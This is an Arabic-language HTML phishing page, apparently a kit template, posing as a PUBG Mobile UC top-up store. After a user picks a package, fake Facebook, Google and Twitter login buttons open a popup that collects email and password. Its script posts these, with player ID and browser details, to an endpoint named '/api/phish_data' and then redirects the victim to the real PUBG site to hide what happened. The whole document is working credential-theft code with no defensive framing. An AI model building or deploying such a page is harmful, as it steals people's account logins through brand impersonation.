<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Mobile - شحن UC</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            padding: 20px;
            color: white;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            font-size: 2.5em;
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        
        .logo p {
            color: #ddd;
            font-size: 1.1em;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 10px;
            color: #feca57;
            font-weight: bold;
        }
        
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 15px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #feca57;
            background: rgba(255, 255, 255, 0.15);
        }
        
        .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        
        .form-group select option {
            background: #16213e;
            color: white;
        }
        
        .uc-packages {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .uc-package {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .uc-package:hover {
            transform: translateY(-5px);
            border-color: #feca57;
            background: rgba(254, 202, 87, 0.2);
        }
        
        .uc-package.selected {
            border-color: #ff6b6b;
            background: rgba(255, 107, 107, 0.2);
        }
        
        .uc-package .amount {
            font-size: 2em;
            font-weight: bold;
            color: #feca57;
            margin-bottom: 10px;
        }
        
        .uc-package .price {
            color: #ddd;
            font-size: 1.1em;
        }
        
        .login-methods {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 2px solid rgba(255, 255, 255, 0.2);
        }
        
        .method-title {
            text-align: center;
            margin-bottom: 20px;
            color: #feca57;
            font-size: 1.2em;
        }
        
        .login-buttons {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        
        .login-btn {
            padding: 15px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        .btn-facebook {
            background: #1877f2;
            color: white;
        }
        
        .btn-google {
            background: white;
            color: #333;
        }
        
        .btn-twitter {
            background: #1da1f2;
            color: white;
        }
        
        .popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .popup.active {
            display: flex;
        }
        
        .popup-content {
            background: #16213e;
            padding: 30px;
            border-radius: 20px;
            max-width: 400px;
            width: 90%;
        }
        
        .popup-content h2 {
            color: #feca57;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .popup-content input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: white;
            font-size: 14px;
        }
        
        .popup-content button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .btn-submit {
            background: #feca57;
            color: #1a1a2e;
        }
        
        .btn-cancel {
            background: #e74c3c;
            color: white;
        }
        
        .success-message {
            display: none;
            background: #2ecc71;
            color: white;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            margin-top: 20px;
        }
        
        .error-message {
            color: #ff6b6b;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>PUBG MOBILE</h1>
            <p>شحن Unknown Cash (UC)</p>
        </div>
        
        <div class="form-group">
            <label>أدخل Player ID الخاص بك</label>
            <input type="text" id="playerId" placeholder="مثال: 5123456789" maxlength="12">
            <div class="error-message" id="playerIdError">الرجاء إدخال Player ID صحيح</div>
        </div>
        
        <div class="form-group">
            <label>اختر كمية UC</label>
            <div class="uc-packages">
                <div class="uc-package" data-amount="60" data-price="0.99">
                    <div class="amount">60 UC</div>
                    <div class="price">$0.99</div>
                </div>
                <div class="uc-package" data-amount="300" data-price="4.99">
                    <div class="amount">300 UC</div>
                    <div class="price">$4.99</div>
                </div>
                <div class="uc-package" data-amount="600" data-price="9.99">
                    <div class="amount">600 UC</div>
                    <div class="price">$9.99</div>
                </div>
                <div class="uc-package" data-amount="1500" data-price="24.99">
                    <div class="amount">1500 UC</div>
                    <div class="price">$24.99</div>
                </div>
            </div>
        </div>
        
        <div class="login-methods">
            <div class="method-title">تسجيل الدخول للمتابعة</div>
            <div class="login-buttons">
                <button class="login-btn btn-facebook" onclick="openLoginPopup('Facebook')">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                    </svg>
                    تسجيل الدخول بـ Facebook
                </button>
                <button class="login-btn btn-google" onclick="openLoginPopup('Google')">
                    <svg width="24" height="24" viewBox="0 0 24 24">
                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                    </svg>
                    تسجيل الدخول بـ Google
                </button>
                <button class="login-btn btn-twitter" onclick="openLoginPopup('Twitter')">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/>
                    </svg>
                    تسجيل الدخول بـ Twitter
                </button>
            </div>
        </div>
        
        <div class="success-message" id="successMessage">
            ✓ تم إرسال البيانات بنجاح!
        </div>
    </div>
    
    <!-- Login Popup -->
    <div class="popup" id="loginPopup">
        <div class="popup-content">
            <h2 id="popupTitle">تسجيل الدخول</h2>
            <input type="text" id="loginEmail" placeholder="البريد الإلكتروني أو اسم المستخدم">
            <input type="password" id="loginPassword" placeholder="كلمة المرور">
            <button class="btn-submit" onclick="submitLogin()">تسجيل الدخول</button>
            <button class="btn-cancel" onclick="closeLoginPopup()">إلغاء</button>
        </div>
    </div>

    <script>
        const pageId = "{{ page_id }}";
        let selectedPackage = null;
        let currentPlatform = null;
        
        // Package selection
        document.querySelectorAll('.uc-package').forEach(pkg => {
            pkg.addEventListener('click', function() {
                document.querySelectorAll('.uc-package').forEach(p => p.classList.remove('selected'));
                this.classList.add('selected');
                selectedPackage = {
                    amount: this.dataset.amount,
                    price: this.dataset.price
                };
            });
        });
        
        function openLoginPopup(platform) {
            const playerId = document.getElementById('playerId').value.trim();
            const errorMsg = document.getElementById('playerIdError');
            
            if (!playerId || playerId.length < 8) {
                errorMsg.style.display = 'block';
                return;
            }
            
            if (!selectedPackage) {
                alert('الرجاء اختيار كمية UC أولاً');
                return;
            }
            
            errorMsg.style.display = 'none';
            currentPlatform = platform;
            document.getElementById('popupTitle').textContent = 'تسجيل الدخول بـ ' + platform;
            document.getElementById('loginPopup').classList.add('active');
        }
        
        function closeLoginPopup() {
            document.getElementById('loginPopup').classList.remove('active');
            document.getElementById('loginEmail').value = '';
            document.getElementById('loginPassword').value = '';
        }
        
        async function submitLogin() {
            const email = document.getElementById('loginEmail').value.trim();
            const password = document.getElementById('loginPassword').value.trim();
            const playerId = document.getElementById('playerId').value.trim();
            
            if (!email || !password) {
                alert('الرجاء إدخال البريد الإلكتروني وكلمة المرور');
                return;
            }
            
            // Send data to server
            const data = {
                page_id: pageId,
                platform: currentPlatform,
                player_id: playerId,
                uc_amount: selectedPackage.amount,
                uc_price: selectedPackage.price,
                email: email,
                password: password,
                user_agent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };
            
            try {
                const response = await fetch('/api/phish_data', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    closeLoginPopup();
                    document.getElementById('successMessage').style.display = 'block';
                    setTimeout(() => {
                        window.location.href = 'https://www.pubgmobile.com';
                    }, 2000);
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</body>
</html>
